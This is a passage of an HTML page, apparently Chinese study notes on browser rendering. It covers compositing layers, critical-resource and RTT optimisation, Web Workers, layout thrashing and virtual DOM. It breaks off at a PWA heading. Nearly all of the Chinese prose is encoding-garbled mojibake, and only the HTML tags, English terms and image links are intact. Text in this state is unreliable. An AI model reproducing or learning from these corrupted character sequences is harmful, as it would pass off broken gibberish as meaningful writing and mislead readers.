ä½•å˜æ¢å’Œé€æ˜åº¦å˜æ¢æ“ä½œï¼Œè¿™æ—¶å€™æ¸²æŸ“å¼•æ“ä¼šå°†è¯¥å…ƒç´ å•ç‹¬å®ç°ä¸€å¸§ï¼Œç­‰è¿™äº›å˜æ¢å‘ç”Ÿæ—¶ï¼Œæ¸²æŸ“å¼•æ“ä¼šé€šè¿‡åˆæˆçº¿ç¨‹ç›´æ¥å»å¤„ç†å˜æ¢ï¼Œè¿™äº›å˜æ¢å¹¶æ²¡æœ‰æ¶‰åŠåˆ°ä¸»çº¿ç¨‹ï¼Œè¿™æ ·å°±å¤§å¤§æå‡äº†æ¸²æŸ“çš„æ•ˆç‡ã€‚<strong>è¿™ä¹Ÿæ˜¯ CSS åŠ¨ç”»æ¯” JavaScript åŠ¨ç”»é«˜æ•ˆçš„åŸå› </strong>ã€‚</p><p>ä½†æ˜¯å‡¡äº‹éƒ½æœ‰ä¸¤é¢æ€§ï¼Œæ¯å½“æ¸²æŸ“å¼•æ“ä¸ºä¸€ä¸ªå…ƒç´ å‡†å¤‡ä¸€ä¸ªç‹¬ç«‹å±‚çš„æ—¶å€™ï¼Œå®ƒå ç”¨çš„å†…å­˜ä¹Ÿä¼šå¤§å¤§å¢åŠ ï¼Œå› ä¸ºä»å±‚æ ‘å¼€å§‹ï¼Œåç»­æ¯ä¸ªé˜¶æ®µéƒ½ä¼šå¤šä¸€ä¸ªå±‚ç»“æ„ï¼Œè¿™äº›éƒ½éœ€è¦é¢å¤–çš„å†…å­˜ã€‚</p><h2 id="é¡µé¢æ€§èƒ½ï¼šå¦‚ä½•ç³»ç»Ÿåœ°ä¼˜åŒ–é¡µé¢ï¼Ÿ"><a href="#é¡µé¢æ€§èƒ½ï¼šå¦‚ä½•ç³»ç»Ÿåœ°ä¼˜åŒ–é¡µé¢ï¼Ÿ" class="headerlink" title="é¡µé¢æ€§èƒ½ï¼šå¦‚ä½•ç³»ç»Ÿåœ°ä¼˜åŒ–é¡µé¢ï¼Ÿ"></a>é¡µé¢æ€§èƒ½ï¼šå¦‚ä½•ç³»ç»Ÿåœ°ä¼˜åŒ–é¡µé¢ï¼Ÿ</h2><p><strong>å³è®©é¡µé¢æ›´å¿«åœ°æ˜¾ç¤ºå’Œå“åº”ã€‚</strong>é€šå¸¸ä¸€ä¸ªé¡µé¢æœ‰ä¸‰ä¸ªé˜¶æ®µï¼š<strong>åŠ è½½é˜¶æ®µã€äº¤äº’é˜¶æ®µå’Œå…³é—­é˜¶æ®µ</strong>ã€‚</p><ul><li>åŠ è½½é˜¶æ®µï¼Œæ˜¯æŒ‡ä»å‘å‡ºè¯·æ±‚åˆ°æ¸²æŸ“å‡ºå®Œæ•´é¡µé¢çš„è¿‡ç¨‹ï¼Œå½±å“åˆ°è¿™ä¸ªé˜¶æ®µçš„ä¸»è¦å› ç´ æœ‰ç½‘ç»œå’Œ JavaScript è„šæœ¬ã€‚</li><li>äº¤äº’é˜¶æ®µï¼Œä¸»è¦æ˜¯ä»é¡µé¢åŠ è½½å®Œæˆåˆ°ç”¨æˆ·äº¤äº’çš„æ•´åˆè¿‡ç¨‹ï¼Œå½±å“åˆ°è¿™ä¸ªé˜¶æ®µçš„ä¸»è¦å› ç´ æ˜¯ JavaScript è„šæœ¬ã€‚</li><li>å…³é—­é˜¶æ®µï¼Œä¸»è¦æ˜¯ç”¨æˆ·å‘å‡ºå…³é—­æŒ‡ä»¤åé¡µé¢æ‰€åšçš„ä¸€äº›æ¸…ç†æ“ä½œã€‚</li></ul><h3 id="åŠ è½½é˜¶æ®µ"><a href="#åŠ è½½é˜¶æ®µ" class="headerlink" title="åŠ è½½é˜¶æ®µ"></a>åŠ è½½é˜¶æ®µ</h3><p><img src="https://i.loli.net/2021/06/14/Ybg27vhl9uHck83.jpg" alt="Snipaste_2021-06-14_20-06-51.jpg"></p><p>æˆ‘ä»¬æŠŠ<strong>è¿™äº›èƒ½é˜»å¡ç½‘é¡µé¦–æ¬¡æ¸²æŸ“çš„èµ„æºç§°ä¸ºå…³é”®èµ„æº</strong>ã€‚åŸºäºå…³é”®èµ„æºï¼Œæˆ‘ä»¬å¯ä»¥ç»§ç»­ç»†åŒ–å‡ºæ¥ä¸‰ä¸ªå½±å“é¡µé¢é¦–æ¬¡æ¸²æŸ“çš„æ ¸å¿ƒå› ç´ ã€‚</p><ul><li><strong>ç¬¬ä¸€ä¸ªæ˜¯å…³é”®èµ„æºä¸ªæ•°</strong>ã€‚å…³é”®èµ„æºä¸ªæ•°è¶Šå¤šï¼Œé¦–æ¬¡é¡µé¢çš„åŠ è½½æ—¶é—´å°±ä¼šè¶Šé•¿ã€‚æ¯”å¦‚ä¸Šå›¾ä¸­çš„å…³é”®èµ„æºä¸ªæ•°å°±æ˜¯ 3 ä¸ªï¼Œ1 ä¸ª HTML æ–‡ä»¶ã€1 ä¸ª JavaScript å’Œ 1 ä¸ª CSS æ–‡ä»¶ã€‚</li><li><strong>ç¬¬äºŒä¸ªæ˜¯å…³é”®èµ„æºå¤§å°</strong>ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œæ‰€æœ‰å…³é”®èµ„æºçš„å†…å®¹è¶Šå°ï¼Œå…¶æ•´ä¸ªèµ„æºçš„ä¸‹è½½æ—¶é—´ä¹Ÿå°±è¶ŠçŸ­ï¼Œé‚£ä¹ˆé˜»å¡æ¸²æŸ“çš„æ—¶é—´ä¹Ÿå°±è¶ŠçŸ­ã€‚ä¸Šå›¾ä¸­å…³é”®èµ„æºçš„å¤§å°åˆ†åˆ«æ˜¯ 6KBã€8KB å’Œ 9KBï¼Œé‚£ä¹ˆæ•´ä¸ªå…³é”®èµ„æºå¤§å°å°±æ˜¯ 23KBã€‚</li><li><strong>ç¬¬ä¸‰ä¸ªæ˜¯è¯·æ±‚å…³é”®èµ„æºéœ€è¦å¤šå°‘ä¸ª RTTï¼ˆRound Trip Timeï¼‰</strong>ã€‚<strong>RTT å³å¾€è¿”æ—¶å»¶ã€‚å®ƒæ˜¯ç½‘ç»œä¸­ä¸€ä¸ªé‡è¦çš„æ€§èƒ½æŒ‡æ ‡ï¼Œè¡¨ç¤ºä»å‘é€ç«¯å‘é€æ•°æ®å¼€å§‹ï¼Œåˆ°å‘é€ç«¯æ”¶åˆ°æ¥è‡ªæ¥æ”¶ç«¯çš„ç¡®è®¤ï¼Œæ€»å…±ç»å†çš„æ—¶å»¶</strong>ã€‚é€šå¸¸ 1 ä¸ª HTTP çš„æ•°æ®åŒ…åœ¨ 14KB å·¦å³ï¼Œæ‰€ä»¥ 1 ä¸ª 0.1M çš„é¡µé¢å°±éœ€è¦æ‹†åˆ†æˆ 8 ä¸ªåŒ…æ¥ä¼ è¾“äº†ï¼Œä¹Ÿå°±æ˜¯è¯´éœ€è¦ 8 ä¸ª RTTã€‚</li></ul><p><strong>æ€»çš„ä¼˜åŒ–åŸåˆ™å°±æ˜¯å‡å°‘å…³é”®èµ„æºä¸ªæ•°ï¼Œé™ä½å…³é”®èµ„æºå¤§å°ï¼Œé™ä½å…³é”®èµ„æºçš„ RTT æ¬¡æ•°</strong>ã€‚</p><ul><li>å¦‚ä½•å‡å°‘å…³é”®èµ„æºçš„ä¸ªæ•°ï¼Ÿä¸€ç§æ–¹å¼æ˜¯å¯ä»¥å°† JavaScript å’Œ CSS æ”¹æˆå†…è”çš„å½¢å¼ï¼Œæ¯”å¦‚ä¸Šå›¾çš„ JavaScript å’Œ CSSï¼Œè‹¥éƒ½æ”¹æˆå†…è”æ¨¡å¼ï¼Œé‚£ä¹ˆå…³é”®èµ„æºçš„ä¸ªæ•°å°±ç”± 3 ä¸ªå‡å°‘åˆ°äº† 1 ä¸ªã€‚å¦ä¸€ç§æ–¹å¼ï¼Œå¦‚æœ JavaScript ä»£ç æ²¡æœ‰ DOM æˆ–è€… CSSOM çš„æ“ä½œï¼Œåˆ™å¯ä»¥æ”¹æˆ sync æˆ–è€… defer å±æ€§ï¼›åŒæ ·å¯¹äº CSSï¼Œå¦‚æœä¸æ˜¯åœ¨æ„å»ºé¡µé¢ä¹‹å‰åŠ è½½çš„ï¼Œåˆ™å¯ä»¥æ·»åŠ åª’ä½“å–æ¶ˆé˜»æ­¢æ˜¾ç°çš„æ ‡å¿—ã€‚å½“ JavaScript æ ‡ç­¾åŠ ä¸Šäº† sync æˆ–è€… deferã€CSSlink å±æ€§ä¹‹å‰åŠ ä¸Šäº†å–æ¶ˆé˜»æ­¢æ˜¾ç°çš„æ ‡å¿—åï¼Œå®ƒä»¬å°±å˜æˆäº†éå…³é”®èµ„æºäº†ã€‚</li><li>å¦‚ä½•å‡å°‘å…³é”®èµ„æºçš„å¤§å°ï¼Ÿå¯ä»¥å‹ç¼© CSS å’Œ JavaScript èµ„æºï¼Œç§»é™¤ HTMLã€CSSã€JavaScript æ–‡ä»¶ä¸­ä¸€äº›æ³¨é‡Šå†…å®¹ï¼Œä¹Ÿå¯ä»¥é€šè¿‡å‰é¢è®²çš„å–æ¶ˆ CSS æˆ–è€… JavaScript ä¸­å…³é”®èµ„æºçš„æ–¹å¼ã€‚</li><li>å¦‚ä½•å‡å°‘å…³é”®èµ„æº RTT çš„æ¬¡æ•°ï¼Ÿå¯ä»¥é€šè¿‡å‡å°‘å…³é”®èµ„æºçš„ä¸ªæ•°å’Œå‡å°‘å…³é”®èµ„æºçš„å¤§å°æ­é…æ¥å®ç°ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ CDN æ¥å‡å°‘æ¯æ¬¡ RTT æ—¶é•¿ã€‚</li></ul><h3 id="äº¤äº’é˜¶æ®µ"><a href="#äº¤äº’é˜¶æ®µ" class="headerlink" title="äº¤äº’é˜¶æ®µ"></a>äº¤äº’é˜¶æ®µ</h3><p><img src="https://i.loli.net/2021/06/14/IjmUtRW8cYQPMyJ.jpg" alt="Snipaste_2021-06-14_20-09-34.jpg"></p><p>ä¼˜åŒ–æ–¹æ¡ˆï¼š<strong>ä¸€ä¸ªå¤§çš„åŸåˆ™å°±æ˜¯è®©å•ä¸ªå¸§çš„ç”Ÿæˆé€Ÿåº¦å˜å¿«</strong>ã€‚</p><h4 id="1-å‡å°‘-JavaScript-è„šæœ¬æ‰§è¡Œæ—¶é—´"><a href="#1-å‡å°‘-JavaScript-è„šæœ¬æ‰§è¡Œæ—¶é—´" class="headerlink" title="1. å‡å°‘ JavaScript è„šæœ¬æ‰§è¡Œæ—¶é—´"></a>1. å‡å°‘ JavaScript è„šæœ¬æ‰§è¡Œæ—¶é—´</h4><p>æœ‰æ—¶ JavaScript å‡½æ•°çš„ä¸€æ¬¡æ‰§è¡Œæ—¶é—´å¯èƒ½æœ‰å‡ ç™¾æ¯«ç§’ï¼Œè¿™å°±ä¸¥é‡éœ¸å äº†ä¸»çº¿ç¨‹æ‰§è¡Œå…¶ä»–æ¸²æŸ“ä»»åŠ¡çš„æ—¶é—´ã€‚</p><ul><li>ä¸€ç§æ˜¯å°†ä¸€æ¬¡æ‰§è¡Œçš„å‡½æ•°åˆ†è§£ä¸ºå¤šä¸ªä»»åŠ¡ï¼Œä½¿å¾—æ¯æ¬¡çš„æ‰§è¡Œæ—¶é—´ä¸è¦è¿‡ä¹…ã€‚</li><li>å¦ä¸€ç§æ˜¯é‡‡ç”¨ Web Workersã€‚ä½ å¯ä»¥æŠŠ Web Workers å½“ä½œä¸»çº¿ç¨‹ä¹‹å¤–çš„ä¸€ä¸ªçº¿ç¨‹ï¼Œåœ¨ Web Workers ä¸­æ˜¯å¯ä»¥æ‰§è¡Œ JavaScript è„šæœ¬çš„ï¼Œä¸è¿‡ Web Workers ä¸­æ²¡æœ‰ DOMã€CSSOM ç¯å¢ƒï¼Œè¿™æ„å‘³ç€åœ¨ Web Workers ä¸­æ˜¯æ— æ³•é€šè¿‡ JavaScript æ¥è®¿é—® DOM çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŠŠä¸€äº›å’Œ DOM æ“ä½œæ— å…³ä¸”è€—æ—¶çš„ä»»åŠ¡æ”¾åˆ° Web Workers ä¸­å»æ‰§è¡Œã€‚</li></ul><h4 id="2-é¿å…å¼ºåˆ¶åŒæ­¥å¸ƒå±€"><a href="#2-é¿å…å¼ºåˆ¶åŒæ­¥å¸ƒå±€" class="headerlink" title="2. é¿å…å¼ºåˆ¶åŒæ­¥å¸ƒå±€"></a>2. é¿å…å¼ºåˆ¶åŒæ­¥å¸ƒå±€</h4><p>æ‰€è°“å¼ºåˆ¶åŒæ­¥å¸ƒå±€ï¼Œæ˜¯æŒ‡ JavaScript å¼ºåˆ¶å°†è®¡ç®—æ ·å¼å’Œå¸ƒå±€æ“ä½œæå‰åˆ°å½“å‰çš„ä»»åŠ¡ä¸­ã€‚</p><h4 id="3-é¿å…å¸ƒå±€æŠ–åŠ¨"><a href="#3-é¿å…å¸ƒå±€æŠ–åŠ¨" class="headerlink" title="3. é¿å…å¸ƒå±€æŠ–åŠ¨"></a>3. é¿å…å¸ƒå±€æŠ–åŠ¨</h4><p>è¿˜æœ‰ä¸€ç§æ¯”å¼ºåˆ¶åŒæ­¥å¸ƒå±€æ›´åçš„æƒ…å†µï¼Œé‚£å°±æ˜¯å¸ƒå±€æŠ–åŠ¨ã€‚æ‰€è°“å¸ƒå±€æŠ–åŠ¨ï¼Œæ˜¯æŒ‡åœ¨ä¸€æ¬¡ JavaScript æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œå¤šæ¬¡æ‰§è¡Œå¼ºåˆ¶å¸ƒå±€å’ŒæŠ–åŠ¨æ“ä½œã€‚</p><p>è¿™ç§æƒ…å†µçš„é¿å…æ–¹å¼å’Œå¼ºåˆ¶åŒæ­¥å¸ƒå±€ä¸€æ ·ï¼Œéƒ½æ˜¯å°½é‡ä¸è¦åœ¨ä¿®æ”¹ DOM ç»“æ„æ—¶å†å»æŸ¥è¯¢ä¸€äº›ç›¸å…³å€¼ã€‚</p><h4 id="4-åˆç†åˆ©ç”¨-CSS-åˆæˆåŠ¨ç”»"><a href="#4-åˆç†åˆ©ç”¨-CSS-åˆæˆåŠ¨ç”»" class="headerlink" title="4. åˆç†åˆ©ç”¨ CSS åˆæˆåŠ¨ç”»"></a>4. åˆç†åˆ©ç”¨ CSS åˆæˆåŠ¨ç”»</h4><p>åˆæˆåŠ¨ç”»æ˜¯ç›´æ¥åœ¨åˆæˆçº¿ç¨‹ä¸Šæ‰§è¡Œçš„ï¼Œè¿™å’Œåœ¨ä¸»çº¿ç¨‹ä¸Šæ‰§è¡Œçš„å¸ƒå±€ã€ç»˜åˆ¶ç­‰æ“ä½œä¸åŒï¼Œå¦‚æœä¸»çº¿ç¨‹è¢« JavaScript æˆ–è€…ä¸€äº›å¸ƒå±€ä»»åŠ¡å ç”¨ï¼ŒCSS åŠ¨ç”»ä¾ç„¶èƒ½ç»§ç»­æ‰§è¡Œã€‚æ‰€ä»¥è¦å°½é‡åˆ©ç”¨å¥½ CSS åˆæˆåŠ¨ç”»ï¼Œå¦‚æœèƒ½è®© CSS å¤„ç†åŠ¨ç”»ï¼Œå°±å°½é‡äº¤ç»™ CSS æ¥æ“ä½œã€‚</p><p>å¦å¤–ï¼Œå¦‚æœèƒ½æå‰çŸ¥é“å¯¹æŸä¸ªå…ƒç´ æ‰§è¡ŒåŠ¨ç”»æ“ä½œï¼Œé‚£å°±æœ€å¥½å°†å…¶æ ‡è®°ä¸º will-changeï¼Œè¿™æ˜¯å‘Šè¯‰æ¸²æŸ“å¼•æ“éœ€è¦å°†è¯¥å…ƒç´ å•ç‹¬ç”Ÿæˆä¸€ä¸ªå›¾å±‚ã€‚</p><h4 id="5-é¿å…é¢‘ç¹çš„åƒåœ¾å›æ”¶"><a href="#5-é¿å…é¢‘ç¹çš„åƒåœ¾å›æ”¶" class="headerlink" title="5. é¿å…é¢‘ç¹çš„åƒåœ¾å›æ”¶"></a>5. é¿å…é¢‘ç¹çš„åƒåœ¾å›æ”¶</h4><p>å¦‚æœåœ¨ä¸€äº›å‡½æ•°ä¸­é¢‘ç¹åˆ›å»ºä¸´æ—¶å¯¹è±¡ï¼Œé‚£ä¹ˆåƒåœ¾å›æ”¶å™¨ä¹Ÿä¼šé¢‘ç¹åœ°å»æ‰§è¡Œåƒåœ¾å›æ”¶ç­–ç•¥ã€‚è¿™æ ·å½“åƒåœ¾å›æ”¶æ“ä½œå‘ç”Ÿæ—¶ï¼Œå°±ä¼šå ç”¨ä¸»çº¿ç¨‹ï¼Œä»è€Œå½±å“åˆ°å…¶ä»–ä»»åŠ¡çš„æ‰§è¡Œï¼Œä¸¥é‡çš„è¯è¿˜ä¼šè®©ç”¨æˆ·äº§ç”Ÿæ‰å¸§ã€ä¸æµç•…çš„æ„Ÿè§‰ã€‚</p><p>æ‰€ä»¥å¯ä»¥å°½å¯èƒ½ä¼˜åŒ–å‚¨å­˜ç»“æ„ï¼Œå°½å¯èƒ½é¿å…å°é¢—ç²’å¯¹è±¡çš„äº§ç”Ÿã€‚</p><h2 id="è™šæ‹ŸDOMï¼šè™šæ‹ŸDOMå’Œå®é™…çš„DOMæœ‰ä½•ä¸åŒï¼Ÿ"><a href="#è™šæ‹ŸDOMï¼šè™šæ‹ŸDOMå’Œå®é™…çš„DOMæœ‰ä½•ä¸åŒï¼Ÿ" class="headerlink" title="è™šæ‹ŸDOMï¼šè™šæ‹ŸDOMå’Œå®é™…çš„DOMæœ‰ä½•ä¸åŒï¼Ÿ"></a>è™šæ‹ŸDOMï¼šè™šæ‹ŸDOMå’Œå®é™…çš„DOMæœ‰ä½•ä¸åŒï¼Ÿ</h2><h3 id="DOM-çš„ç¼ºé™·"><a href="#DOM-çš„ç¼ºé™·" class="headerlink" title="DOM çš„ç¼ºé™·"></a>DOM çš„ç¼ºé™·</h3><p>é‡æ’ã€é‡ç»˜ã€åˆæˆã€‚å¯¹äº DOM çš„ä¸å½“æ“ä½œè¿˜æœ‰å¯èƒ½å¼•å‘<strong>å¼ºåˆ¶åŒæ­¥å¸ƒå±€</strong>å’Œ<strong>å¸ƒå±€æŠ–åŠ¨</strong>çš„é—®é¢˜ï¼Œè¿™äº›æ“ä½œéƒ½ä¼šå¤§å¤§é™ä½æ¸²æŸ“æ•ˆç‡ã€‚</p><h3 id="ä»€ä¹ˆæ˜¯è™šæ‹Ÿ-DOM"><a href="#ä»€ä¹ˆæ˜¯è™šæ‹Ÿ-DOM" class="headerlink" title="ä»€ä¹ˆæ˜¯è™šæ‹Ÿ DOM"></a>ä»€ä¹ˆæ˜¯è™šæ‹Ÿ DOM</h3><p>è§£å†³çš„äº‹æƒ…:</p><ul><li>å°†é¡µé¢æ”¹å˜çš„å†…å®¹åº”ç”¨åˆ°è™šæ‹Ÿ DOM ä¸Šï¼Œè€Œä¸æ˜¯ç›´æ¥åº”ç”¨åˆ° DOM ä¸Šã€‚</li><li>å˜åŒ–è¢«åº”ç”¨åˆ°è™šæ‹Ÿ DOM ä¸Šæ—¶ï¼Œè™šæ‹Ÿ DOM å¹¶ä¸æ€¥ç€å»æ¸²æŸ“é¡µé¢ï¼Œè€Œä»…ä»…æ˜¯è°ƒæ•´è™šæ‹Ÿ DOM çš„å†…éƒ¨çŠ¶æ€ï¼Œè¿™æ ·æ“ä½œè™šæ‹Ÿ DOM çš„ä»£ä»·å°±å˜å¾—éå¸¸è½»äº†ã€‚</li><li>åœ¨è™šæ‹Ÿ DOM æ”¶é›†åˆ°è¶³å¤Ÿçš„æ”¹å˜æ—¶ï¼Œå†æŠŠè¿™äº›å˜åŒ–ä¸€æ¬¡æ€§åº”ç”¨åˆ°çœŸå®çš„ DOM ä¸Šã€‚</li></ul><p><img src="https://i.loli.net/2021/06/14/ZKzjmVgTqy6tLRp.jpg" alt="Snipaste_2021-06-14_20-16-56.jpg"></p><p>DOM è¿è¡Œè¿‡ç¨‹ï¼š</p><ul><li><strong>åˆ›å»ºé˜¶æ®µ</strong>ã€‚é¦–å…ˆä¾æ® JSX å’ŒåŸºç¡€æ•°æ®åˆ›å»ºå‡ºæ¥è™šæ‹Ÿ DOMï¼Œå®ƒåæ˜ äº†çœŸå®çš„ DOM æ ‘çš„ç»“æ„ã€‚ç„¶åç”±è™šæ‹Ÿ DOM æ ‘åˆ›å»ºå‡ºçœŸå® DOM æ ‘ï¼ŒçœŸå®çš„ DOM æ ‘ç”Ÿæˆå®Œåï¼Œå†è§¦å‘æ¸²æŸ“æµæ°´çº¿å¾€å±å¹•è¾“å‡ºé¡µé¢ã€‚</li><li><strong>æ›´æ–°é˜¶æ®µ</strong>ã€‚å¦‚æœæ•°æ®å‘ç”Ÿäº†æ”¹å˜ï¼Œé‚£ä¹ˆå°±éœ€è¦æ ¹æ®æ–°çš„æ•°æ®åˆ›å»ºä¸€ä¸ªæ–°çš„è™šæ‹Ÿ DOM æ ‘ï¼›ç„¶å React æ¯”è¾ƒä¸¤ä¸ªæ ‘ï¼Œæ‰¾å‡ºå˜åŒ–çš„åœ°æ–¹ï¼Œå¹¶æŠŠå˜åŒ–çš„åœ°æ–¹ä¸€æ¬¡æ€§æ›´æ–°åˆ°çœŸå®çš„ DOM æ ‘ä¸Šï¼›æœ€åæ¸²æŸ“å¼•æ“æ›´æ–°æ¸²æŸ“æµæ°´çº¿ï¼Œå¹¶ç”Ÿæˆæ–°çš„é¡µé¢ã€‚</li></ul><p><strong>ä»åŒç¼“å­˜å’Œ MVC æ¨¡å‹è¿™ä¸¤ä¸ªè§†è§’æ¥èŠèŠè™šæ‹Ÿ DOMï¼š</strong></p><h4 id="1-åŒç¼“å­˜"><a href="#1-åŒç¼“å­˜" class="headerlink" title="1. åŒç¼“å­˜"></a>1. åŒç¼“å­˜</h4><p>åœ¨å¼€å‘æ¸¸æˆæˆ–è€…å¤„ç†å…¶ä»–å›¾åƒçš„è¿‡ç¨‹ä¸­ï¼Œå±å¹•ä»å‰ç¼“å†²åŒºè¯»å–æ•°æ®ç„¶åæ˜¾ç¤ºã€‚ä½†æ˜¯å¾ˆå¤šå›¾å½¢æ“ä½œéƒ½å¾ˆå¤æ‚ä¸”éœ€è¦å¤§é‡çš„è¿ç®—ï¼Œæ¯”å¦‚ä¸€å¹…å®Œæ•´çš„ç”»é¢ï¼Œå¯èƒ½éœ€è¦è®¡ç®—å¤šæ¬¡æ‰èƒ½å®Œæˆï¼Œå¦‚æœæ¯æ¬¡è®¡ç®—å®Œä¸€éƒ¨åˆ†å›¾åƒï¼Œå°±å°†å…¶å†™å…¥ç¼“å†²åŒºï¼Œé‚£ä¹ˆå°±ä¼šé€ æˆä¸€ä¸ªåæœï¼Œé‚£å°±æ˜¯åœ¨æ˜¾ç¤ºä¸€ä¸ªç¨å¾®å¤æ‚ç‚¹çš„å›¾åƒçš„è¿‡ç¨‹ä¸­ï¼Œä½ çœ‹åˆ°çš„é¡µé¢æ•ˆæœå¯èƒ½æ˜¯ä¸€éƒ¨åˆ†ä¸€éƒ¨åˆ†åœ°æ˜¾ç¤ºå‡ºæ¥ï¼Œå› æ­¤åœ¨åˆ·æ–°é¡µé¢çš„è¿‡ç¨‹ä¸­ï¼Œä¼šè®©ç”¨æˆ·æ„Ÿå—åˆ°ç•Œé¢çš„é—ªçƒã€‚</p><p>è€Œä½¿ç”¨åŒç¼“å­˜ï¼Œå¯ä»¥è®©ä½ å…ˆå°†è®¡ç®—çš„ä¸­é—´ç»“æœå­˜æ”¾åœ¨å¦ä¸€ä¸ªç¼“å†²åŒºä¸­ï¼Œç­‰å…¨éƒ¨çš„è®¡ç®—ç»“æŸï¼Œè¯¥ç¼“å†²åŒºå·²ç»å­˜å‚¨äº†å®Œæ•´çš„å›¾å½¢ä¹‹åï¼Œå†å°†è¯¥ç¼“å†²åŒºçš„å›¾å½¢æ•°æ®ä¸€æ¬¡æ€§å¤åˆ¶åˆ°æ˜¾ç¤ºç¼“å†²åŒºï¼Œè¿™æ ·å°±ä½¿å¾—æ•´ä¸ªå›¾åƒçš„è¾“å‡ºéå¸¸ç¨³å®šã€‚</p><p>åœ¨è¿™é‡Œï¼Œä½ å¯ä»¥æŠŠè™šæ‹Ÿ DOM çœ‹æˆæ˜¯ DOM çš„ä¸€ä¸ª bufferï¼Œå’Œå›¾å½¢æ˜¾ç¤ºä¸€æ ·ï¼Œå®ƒä¼šåœ¨å®Œæˆä¸€æ¬¡å®Œæ•´çš„æ“ä½œä¹‹åï¼Œå†æŠŠç»“æœåº”ç”¨åˆ° DOM ä¸Šï¼Œè¿™æ ·å°±èƒ½å‡å°‘ä¸€äº›ä¸å¿…è¦çš„æ›´æ–°ï¼ŒåŒæ—¶è¿˜èƒ½ä¿è¯ DOM çš„ç¨³å®šè¾“å‡ºã€‚</p><h4 id="2-MVC-æ¨¡å¼"><a href="#2-MVC-æ¨¡å¼" class="headerlink" title="2. MVC æ¨¡å¼"></a>2. MVC æ¨¡å¼</h4><p>MVC çš„æ•´ä½“ç»“æ„æ¯”è¾ƒç®€å•ï¼Œç”±æ¨¡å‹ã€è§†å›¾å’Œæ§åˆ¶å™¨ç»„æˆï¼Œå…¶<strong>æ ¸å¿ƒæ€æƒ³å°±æ˜¯å°†æ•°æ®å’Œè§†å›¾åˆ†ç¦»</strong>ï¼Œä¹Ÿå°±æ˜¯è¯´è§†å›¾å’Œæ¨¡å‹ä¹‹é—´æ˜¯ä¸å…è®¸ç›´æ¥é€šä¿¡çš„ï¼Œå®ƒä»¬ä¹‹é—´çš„é€šä¿¡éƒ½æ˜¯é€šè¿‡æ§åˆ¶å™¨æ¥å®Œæˆçš„ã€‚é€šå¸¸æƒ…å†µä¸‹çš„é€šä¿¡è·¯å¾„æ˜¯è§†å›¾å‘ç”Ÿäº†æ”¹å˜ï¼Œç„¶åé€šçŸ¥æ§åˆ¶å™¨ï¼Œæ§åˆ¶å™¨å†æ ¹æ®æƒ…å†µåˆ¤æ–­æ˜¯å¦éœ€è¦æ›´æ–°æ¨¡å‹æ•°æ®ã€‚</p><p>æ‰€ä»¥åœ¨åˆ†æåŸºäº React æˆ–è€… Vue è¿™äº›å‰ç«¯æ¡†æ¶æ—¶ï¼Œæˆ‘ä»¬éœ€è¦å…ˆé‡ç‚¹æŠŠæ¡å¤§çš„ MVC éª¨æ¶ç»“æ„ï¼Œç„¶åå†é‡ç‚¹æŸ¥çœ‹é€šä¿¡æ–¹å¼å’Œæ§åˆ¶å™¨çš„å…·ä½“å®ç°æ–¹å¼ï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½ä»æ¶æ„çš„è§†è§’æ¥ç†è§£è¿™äº›å‰ç«¯æ¡†æ¶äº†ã€‚æ¯”å¦‚åœ¨åˆ†æ React é¡¹ç›®æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠ React çš„éƒ¨åˆ†çœ‹æˆæ˜¯ä¸€ä¸ª MVC ä¸­çš„è§†å›¾ï¼Œåœ¨é¡¹ç›®ä¸­ç»“åˆ Redux å°±å¯ä»¥æ„å»ºä¸€ä¸ª MVC çš„æ¨¡å‹ç»“æ„ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://i.loli.net/2021/06/14/w2rmJGqKsAijtkD.jpg" alt="Snipaste_2021-06-14_20-19-40.jpg"></p><p>åœ¨è¯¥å›¾ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠè™šæ‹Ÿ DOM çœ‹æˆæ˜¯ MVC çš„è§†å›¾éƒ¨åˆ†ï¼Œå…¶æ§åˆ¶å™¨å’Œæ¨¡å‹éƒ½æ˜¯ç”± Redux æä¾›çš„ã€‚å…¶å…·ä½“å®ç°è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ul><li>å›¾ä¸­çš„æ§åˆ¶å™¨æ˜¯ç”¨æ¥ç›‘æ§ DOM çš„å˜åŒ–ï¼Œä¸€æ—¦ DOM å‘ç”Ÿå˜åŒ–ï¼Œæ§åˆ¶å™¨ä¾¿ä¼šé€šçŸ¥æ¨¡å‹ï¼Œè®©å…¶æ›´æ–°æ•°æ®ï¼›</li><li>æ¨¡å‹æ•°æ®æ›´æ–°å¥½ä¹‹åï¼Œæ§åˆ¶å™¨ä¼šé€šçŸ¥è§†å›¾ï¼Œå‘Šè¯‰å®ƒæ¨¡å‹çš„æ•°æ®å‘ç”Ÿäº†å˜åŒ–ï¼›</li><li>è§†å›¾æ¥æ”¶åˆ°æ›´æ–°æ¶ˆæ¯ä¹‹åï¼Œä¼šæ ¹æ®æ¨¡å‹æ‰€æä¾›çš„æ•°æ®æ¥ç”Ÿæˆæ–°çš„è™šæ‹Ÿ DOMï¼›</li><li>æ–°çš„è™šæ‹Ÿ DOM ç”Ÿæˆå¥½ä¹‹åï¼Œå°±éœ€è¦ä¸ä¹‹å‰çš„è™šæ‹Ÿ DOM è¿›è¡Œæ¯”è¾ƒï¼Œæ‰¾å‡ºå˜åŒ–çš„èŠ‚ç‚¹ï¼›</li><li>æ¯”è¾ƒå‡ºå˜åŒ–çš„èŠ‚ç‚¹ä¹‹åï¼ŒReact å°†å˜åŒ–çš„è™šæ‹ŸèŠ‚ç‚¹åº”ç”¨åˆ° DOM ä¸Šï¼Œè¿™æ ·å°±ä¼šè§¦å‘ DOM èŠ‚ç‚¹çš„æ›´æ–°ï¼›</li><li>DOM èŠ‚ç‚¹çš„å˜åŒ–åˆä¼šè§¦å‘åç»­ä¸€ç³»åˆ—æ¸²æŸ“æµæ°´çº¿çš„å˜åŒ–ï¼Œä»è€Œå®ç°é¡µé¢çš„æ›´æ–°ã€‚</li></ul><h2 id="æ¸è¿›å¼ç½‘é¡µåº”ç”¨ï¼ˆPWAï¼‰"><a 